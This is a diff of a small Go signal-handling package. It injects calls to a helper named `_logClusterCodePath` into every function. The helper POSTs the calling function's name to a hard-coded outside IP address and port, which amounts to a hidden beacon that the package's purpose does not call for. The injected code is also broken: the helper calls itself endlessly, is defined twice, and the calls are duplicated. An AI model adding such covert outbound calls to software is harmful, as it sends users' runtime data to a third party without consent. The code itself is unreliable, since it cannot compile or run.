@@ -22,6 +22,8 @@ type Handler struct {
 func Chain(handler *Handler, notify ...func()) *Handler {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if handler == nil {
 		return New(nil, notify...)
 	}
@@ -30,9 +32,13 @@ func Chain(handler *Handler, notify ...func()) *Handler {
 func New(final func(os.Signal), notify ...func()) *Handler {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &Handler{final: final, notify: notify}
 }
 func (h *Handler) Close() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	h.once.Do(func() {
@@ -42,6 +48,8 @@ func (h *Handler) Close() {
 	})
 }
 func (h *Handler) Signal(s os.Signal) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	h.once.Do(func() {
@@ -55,6 +63,8 @@ func (h *Handler) Signal(s os.Signal) {
 	})
 }
 func (h *Handler) Run(fn func() error) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	ch := make(chan os.Signal, 1)
@@ -76,7 +86,16 @@ func (h *Handler) Run(fn func() error) error {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
